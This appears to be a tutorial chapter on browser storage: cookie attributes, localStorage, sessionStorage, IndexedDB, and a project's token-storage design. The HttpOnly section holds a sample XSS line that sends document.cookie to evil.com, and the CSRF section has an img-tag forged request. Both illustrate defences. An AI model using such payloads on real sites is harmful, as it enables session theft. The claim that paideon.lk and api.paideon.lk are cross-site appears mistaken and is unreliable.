> The browser has multiple ways to persist data on the client side. Each exists for a different reason, has different rules, and is the right tool for a specific job. This part covers cookies in full depth — every attribute, every security implication — plus localStorage, sessionStorage, and IndexedDB.

---

## Table of Contents

1. [Why Client-Side Storage Exists](#1-why-client-side-storage-exists)
2. [Cookies — What They Actually Are](#2-cookies--what-they-actually-are)
3. [The Set-Cookie Header — Every Attribute Explained](#3-the-set-cookie-header--every-attribute-explained)
4. [How Cookies Are Sent Back](#4-how-cookies-are-sent-back)
5. [Cookie Security Implications](#5-cookie-security-implications)
6. [Session Cookies vs Persistent Cookies](#6-session-cookies-vs-persistent-cookies)
7. [First-Party vs Third-Party Cookies](#7-first-party-vs-third-party-cookies)
8. [localStorage — Persistent Client-Side Storage](#8-localstorage--persistent-client-side-storage)
9. [sessionStorage — Tab-Scoped Storage](#9-sessionstorage--tab-scoped-storage)
10. [IndexedDB — Client-Side Database](#10-indexeddb--client-side-database)
11. [Storage Comparison — When to Use What](#11-storage-comparison--when-to-use-what)
12. [Cookies in Paideon — Auth Token Storage Strategy](#12-cookies-in-paideon--auth-token-storage-strategy)

---

## 1. Why Client-Side Storage Exists

HTTP is stateless. Every request is independent. The server has no built-in memory of who you are between requests.

```
Problem:
  Request 1: POST /api/auth/login → you're authenticated
  Request 2: GET /api/students    → server has no idea who you are

Without any storage mechanism, you'd have to send credentials with every request.
That's impractical and insecure.

Solution: store state on the CLIENT.
  The server tells the browser: "Remember this token."
  The browser includes it with every subsequent request.
  The server reads it → knows who you are.
```

The question is where the browser stores it and how it gets sent back.

---

## 2. Cookies — What They Actually Are

A cookie is a small piece of data the server instructs the browser to store and automatically send back on future requests to the same domain.

```
Server response:
  Set-Cookie: refresh_token=eyJhbGciOiJIUzI1NiJ9...; HttpOnly; Secure; SameSite=Strict

Browser stores: {
  name: "refresh_token",
  value: "eyJhbGciOiJIUzI1NiJ9...",
  domain: "paideon.lk",
  path: "/",
  httpOnly: true,
  secure: true,
  sameSite: "Strict",
  expires: [7 days from now]
}

Subsequent request to paideon.lk:
  Cookie: refresh_token=eyJhbGciOiJIUzI1NiJ9...

This happens AUTOMATICALLY. JavaScript does not touch it.
The browser handles it at the HTTP level.
```

A cookie is just a string of key=value pairs. The browser manages the rules around when to send it.

### Cookie Limits

```
Max cookie size:    4,096 bytes (including name, value, attributes)
Max cookies/domain: 50 (varies by browser)
Max cookies total:  3,000 (varies by browser)

Cookies are sent with EVERY matching request.
Storing large data in cookies wastes bandwidth.
Store a token reference, not the data itself.
```

---

## 3. The Set-Cookie Header — Every Attribute Explained

```
Set-Cookie: refresh_token=eyJhbGc...; HttpOnly; Secure; SameSite=Strict; Max-Age=604800; Path=/api/auth; Domain=paideon.lk
```

### Name and Value

```
refresh_token=eyJhbGc...

Name: refresh_token
Value: eyJhbGc...

Value constraints:
  Cannot contain: whitespace, comma, semicolon
  Can contain: most printable ASCII
  URL encoding is commonly used to allow special characters.
```

### Domain

```
Domain=paideon.lk

Controls which domains the cookie is sent to.

If omitted:    cookie sent only to the exact server that set it (api.paideon.lk)
Domain=paideon.lk:  cookie sent to paideon.lk AND all subdomains
                    (paideon.lk, api.paideon.lk, admin.paideon.lk)

Note: you cannot set a cookie for a domain you don't control.
  api.paideon.lk cannot set Domain=google.com — browser ignores it.

Be precise: if your API is api.paideon.lk and your frontend is paideon.lk,
  and you want the cookie on both, set Domain=paideon.lk.
  If you only want it on api.paideon.lk, omit Domain entirely.
```

### Path

```
Path=/api/auth

Cookie is only sent when the request path STARTS WITH this prefix.

Path=/          → sent on all requests (most common)
Path=/api/auth  → sent only to /api/auth, /api/auth/refresh, etc.
                  NOT sent to /api/students or /dashboard

Narrower Path = smaller attack surface.
If a cookie is only needed for auth endpoints, restrict it.
```

### Expires and Max-Age

```
Expires=Fri, 20 Mar 2026 12:00:00 GMT
  Absolute expiry timestamp. Browser timezone-sensitive (can be wrong).

Max-Age=604800
  Relative: seconds from NOW until expiry.
  604800 = 60 × 60 × 24 × 7 = 7 days.
  PREFERRED over Expires (not timezone-dependent).

If both present: Max-Age takes precedence.
If neither: session cookie — deleted when browser closes.

Set Max-Age=0 or Max-Age=-1 to delete a cookie.
```

### Secure

```
Secure

Cookie is ONLY sent over HTTPS connections.
Never sent over plain HTTP.

If your site is HTTPS-only (it should be), always include Secure.
Without Secure: cookie could be sent over an accidental HTTP request
and be visible to a network eavesdropper.
```

### HttpOnly

```
HttpOnly

Cookie is NOT accessible via JavaScript.
document.cookie cannot read it.
fetch() cannot read it.
XSS attacks cannot steal it.

This is the critical attribute for security tokens.

Without HttpOnly:
  Attacker injects: <script>fetch('https://evil.com?c=' + document.cookie)</script>
  Your token is stolen.

With HttpOnly:
  document.cookie → doesn't include this cookie
  XSS cannot steal it.

Tradeoff: JavaScript cannot read the cookie.
  For a refresh token in an HttpOnly cookie: fine.
  Your JS code doesn't need to read it — it's automatically sent by the browser.
  Your server reads it.
```

### SameSite

```
SameSite controls when cookies are sent on cross-site requests.
This is the primary CSRF protection mechanism in modern browsers.

SameSite=Strict
  Cookie is ONLY sent if the request originates from the same site.
  User on evil.com → clicks link to paideon.lk → cookie NOT sent.
  User navigating directly to paideon.lk → cookie sent.
  
  Downside: breaks "log in with one click from email link" flows.
  If a user clicks a link in Gmail → new tab on paideon.lk → no cookie sent.
  They see the logged-out view even though they have a session.

SameSite=Lax  (browser default since ~2020)
  Cookie is sent on same-site requests AND top-level cross-site navigation with safe methods.
  User on evil.com → clicks link to paideon.lk → cookie IS sent (top-level GET).
  User on evil.com → form POST to paideon.lk → cookie NOT sent.
  User on evil.com → AJAX fetch to paideon.lk → cookie NOT sent.
  
  Good balance: allows link-clicking from external sites, blocks CSRF attacks.

SameSite=None; Secure
  Cookie is sent on ALL requests, including cross-site.
  Required for: third-party embeds, OAuth flows, cross-domain API calls.
  MUST include Secure attribute.
  
  Least secure — use only when cross-site requests are intentional.

Default if omitted:
  Chrome 80+, Firefox 79+: defaults to Lax.
  Older browsers: defaults to None (less secure).
  Always specify SameSite explicitly.
```

---

## 4. How Cookies Are Sent Back

Once stored, the browser automatically includes matching cookies in the `Cookie` header of every matching request.

```
Stored cookies:
  refresh_token: domain=paideon.lk, path=/, httpOnly, secure, sameSite=Strict
  theme:         domain=paideon.lk, path=/, secure
  session_id:    domain=api.paideon.lk, path=/

Browser makes request to https://paideon.lk/api/students:
  Cookie: refresh_token=eyJ...; theme=dark
  (session_id not included — domain doesn't match)

Browser makes request to http://paideon.lk/api/students:
  Cookie: theme=dark
  (refresh_token not included — requires Secure, HTTP is not HTTPS)

JavaScript fetch() call from paideon.lk to api.paideon.lk:
  fetch('https://api.paideon.lk/api/students')  ← cross-site request
  Cookie: [nothing, SameSite=Strict]

  fetch('https://api.paideon.lk/api/students', { credentials: 'include' })
  Still no cookie — SameSite=Strict blocks this regardless.

Order in Cookie header:
  Most specific path first (longer path prefix → earlier in list).
  Within same path, no guaranteed order.
  Only name=value is sent — no attributes (HttpOnly, Secure etc. are not sent back).
```

---

## 5. Cookie Security Implications

### XSS (Cross-Site Scripting)

```
Attack: attacker injects malicious JavaScript into your page.
Goal: steal cookies/tokens.

Without HttpOnly:
  document.cookie = "refresh_token=eyJ..."
  Attacker can read, steal, send to their server.

With HttpOnly:
  document.cookie = ""  (HttpOnly cookies not exposed)
  Attacker cannot steal the cookie.
  
HttpOnly does not prevent XSS attacks — it limits their damage.
You still must prevent XSS (see Security folder).
```

### CSRF (Cross-Site Request Forgery)

```
Attack: user visits evil.com while logged into paideon.lk.
evil.com contains:
  <img src="https://paideon.lk/api/students/delete-all">
  
Without SameSite protection:
  Browser makes GET to paideon.lk → automatically sends cookie → disaster.

With SameSite=Strict:
  Cookie not sent on cross-site requests → server sees unauthenticated request → 401.

With SameSite=Lax (default):
  GET cross-site navigation → cookie sent (but still, shouldn't delete on GET).
  POST cross-site → cookie not sent → safe.
  
State-changing operations (DELETE, POST, PUT, PATCH) should never respond to GET.
SameSite=Lax + never using GET for mutations = effective CSRF protection.
```

### Cookie Theft via Network (MITM)

```
Without Secure attribute:
  Cookie sent on HTTP requests → visible to network observer.

With Secure:
  Only sent on HTTPS → encrypted in transit → not visible.

Always use Secure on auth cookies.
```

---

## 6. Session Cookies vs Persistent Cookies

```
Session cookie:
  No Expires or Max-Age attribute.
  Stored in browser MEMORY (not disk).
  Deleted when:
    → Browser window/tab closes
    → Browser session ends
  
  Some browsers restore sessions after closing (session restore feature).
  This can mean session cookies persist across browser restarts.
  Behaviour varies.

Persistent cookie:
  Has Expires or Max-Age.
  Stored on DISK.
  Survives browser restarts.
  Deleted only when:
    → Max-Age expires
    → User explicitly clears cookies
    → Server sends Set-Cookie with Max-Age=0

Paideon strategy:
  refresh_token → persistent (Max-Age=604800, 7 days)
    User stays logged in for 7 days after closing the browser.
  
  access_token → NOT a cookie. Stored in JavaScript memory (not in any storage).
    Lives only as long as the page is open.
    On page refresh: silently refresh from refresh_token cookie.
```

---

## 7. First-Party vs Third-Party Cookies

```
First-party cookie:
  Set by the domain you're visiting.
  You're on paideon.lk → paideon.lk sets a cookie.
  Domain matches the address bar.
  Generally allowed.

Third-party cookie:
  Set by a DIFFERENT domain than the one you're visiting.
  You're on paideon.lk → analytics.google.com sets a cookie.
  Historically used for cross-site tracking.

Third-party cookie deprecation:
  Safari: blocked by default since 2017 (ITP — Intelligent Tracking Prevention).
  Firefox: blocked by default since 2019.
  Chrome: deprecating (was 2024, now rolling out in 2025).
  
  Paideon does not need third-party cookies.
  Your auth cookies are first-party (paideon.lk setting cookies on paideon.lk).
```

---

## 8. localStorage — Persistent Client-Side Storage

localStorage is a key-value store in the browser, persisted to disk, per origin.

```javascript
// Writing
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'si');

// Reading
const theme = localStorage.getItem('theme');   // "dark"
const missing = localStorage.getItem('x');     // null

// Deleting
localStorage.removeItem('theme');

// Clear all
localStorage.clear();

// Iterating
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
}
```

### Characteristics

```
Scope:       Per origin (scheme + domain + port)
             paideon.lk and api.paideon.lk have SEPARATE localStorage.
             http://paideon.lk and https://paideon.lk are SEPARATE.

Persistence: Survives browser close, restarts, page refresh.
             Only cleared by: JS, user clearing browser data, browser storage limits.

Size limit:  ~5–10 MB per origin (varies by browser).

Access:      Synchronous (blocks JavaScript execution — can impact performance for large data).
             Only accessible from JavaScript.
             NOT sent to server (cookies are sent automatically; localStorage is not).

Security:    Accessible from ANY JavaScript on that origin.
             XSS can read ALL localStorage.
             NEVER store auth tokens (JWT access tokens, API keys) in localStorage.
             An XSS attack would immediately steal them.
```

### Safe vs Unsafe Uses

```
Safe to store in localStorage:
  User preferences (theme, language, UI state)
  Non-sensitive UI state (sidebar collapsed, sort order)
  Cached non-sensitive data (list of public announcements)

NEVER store in localStorage:
  JWT tokens (access or refresh)
  API keys
  Passwords
  Any sensitive personal data
  Session identifiers
```

---

## 9. sessionStorage — Tab-Scoped Storage

sessionStorage has the same API as localStorage but different scope.

```javascript
sessionStorage.setItem('draft_message', 'Dear teacher...');
const draft = sessionStorage.getItem('draft_message');
sessionStorage.removeItem('draft_message');
```

### Key Difference from localStorage

```
Scope:       Per tab AND per origin.
             
             Opening a new tab → new empty sessionStorage.
             Duplicating a tab → COPIES sessionStorage to new tab.
             Closing the tab → sessionStorage destroyed.
             Refreshing the page → sessionStorage persists.
             
Persistence: Within the current tab session only.

Use case:    Multi-step form data (don't want it to survive tab close).
             "Currently editing" state.
             Anything that should be discarded when the user closes the tab.
```

---

## 10. IndexedDB — Client-Side Database

IndexedDB is a full browser-side database — transactional, indexed, asynchronous, with support for complex data structures.

```javascript
// Opening a database
const request = indexedDB.open('paideon-cache', 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;
  // Create an object store (like a table)
  const store = db.createObjectStore('students', { keyPath: 'id' });
  store.createIndex('byClass', 'class', { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  
  // Write
  const tx = db.transaction('students', 'readwrite');
  tx.objectStore('students').add({ id: 'cuid-123', name: 'Ashan', class: '10A' });
  
  // Read
  const readTx = db.transaction('students', 'readonly');
  const getReq = readTx.objectStore('students').get('cuid-123');
  getReq.onsuccess = () => console.log(getReq.result);
  
  // Query by index
  const indexReq = readTx.objectStore('students').index('byClass').getAll('10A');
  indexReq.onsuccess = () => console.log(indexReq.result);
};
```

### Characteristics

```
Size:        Hundreds of MB to GB (browser asks user if large)
Async:       Non-blocking (unlike localStorage)
Structured:  Stores JS objects, Blobs, ArrayBuffers — not just strings
Indexed:     Can query by fields, not just primary key
Transactions:Atomic operations

Use case:
  Offline-capable apps (service workers + IndexedDB)
  Large amounts of cached data
  Complex querying needs

For Paideon:
  Could cache student lists, course data for offline access.
  A Progressive Web App (PWA) strategy.
  Likely overkill for initial build — use when offline mode is a requirement.

Security:
  Same origin policy applies.
  XSS can read it — same caution as localStorage.
  Don't store sensitive credentials here.
```

---

## 11. Storage Comparison — When to Use What

```
                Cookie      localStorage    sessionStorage  IndexedDB
────────────────────────────────────────────────────────────────────────
Sent to server  Yes (auto)  No              No              No
Accessible JS   No*         Yes             Yes             Yes
Size            ~4KB        ~5-10MB         ~5-10MB         GB-scale
Persistence     Configurable Permanent      Tab session     Permanent
Scope           Domain/Path  Origin         Tab+Origin      Origin
Async           No           No              No              Yes
Structured data Values only  Values only    Values only     Full objects
XSS risk        Low (HttpOnly) HIGH         HIGH            HIGH

*HttpOnly cookies cannot be accessed by JS.
 Cookies without HttpOnly can be read via document.cookie.

Decision tree:

"Does the server need it?"
  YES → Cookie (with HttpOnly, Secure, SameSite)

"Is it sensitive? (token, credential)"
  YES → HttpOnly Cookie ONLY. Never any other storage.

"Is it a user preference or non-sensitive UI state?"
  → localStorage if should survive tab close
  → sessionStorage if should die with the tab

"Is it large, complex, or needs querying?"
  → IndexedDB
```

---

## 12. Cookies in Paideon — Auth Token Storage Strategy

```
Paideon's auth strategy:

ACCESS TOKEN (short-lived, 15 minutes):
  Stored: JavaScript memory (a variable)
  NOT in any persistent storage.
  
  const accessToken = response.data.accessToken;  // in memory only
  
  Sent with API requests:
    Authorization: Bearer ${accessToken}
  
  On page refresh: gone → silently fetched from refresh endpoint.
  XSS can steal it if it's in memory during an attack.
  But: 15 minute TTL limits damage.

REFRESH TOKEN (long-lived, 7 days):
  Stored: HttpOnly, Secure, SameSite=Strict cookie.
  
  Set-Cookie: refresh_token=eyJ...;
              HttpOnly;
              Secure;
              SameSite=Strict;
              Max-Age=604800;
              Path=/api/auth
  
  JavaScript cannot read it — XSS cannot steal it.
  Automatically sent by browser to /api/auth/* endpoints only.
  Server reads it to issue new access tokens.

LOGIN FLOW:
  POST /api/auth/login
  Response:
    Body:       { accessToken: "eyJ..." }    ← JS stores in memory
    Set-Cookie: refresh_token=eyJ...;...     ← browser stores as HttpOnly cookie

SILENT REFRESH:
  On startup / token expiry:
    POST /api/auth/refresh
    Cookie: refresh_token=... (automatic)
    Response body: { accessToken: "..." }     ← JS stores in memory

LOGOUT:
  POST /api/auth/logout
    Server: revokes refresh token in DB
    Server: Set-Cookie: refresh_token=; Max-Age=0  ← delete cookie
    JS: clear accessToken from memory

Why not store the access token in a cookie too?
  You could. HttpOnly cookie for access token avoids XSS entirely.
  Tradeoff: cookie sent to ALL matching paths, not just API calls.
            You'd need to configure Path carefully.
  Memory storage: only sent when JS explicitly adds it to fetch header.
  Both approaches are valid. Memory + HttpOnly refresh is the most common
  for SPA architectures like Paideon.
```

---

_Next: [Part 05 — REST & API Design](./Part%2005%20-%20REST%20%26%20API%20Design.md)_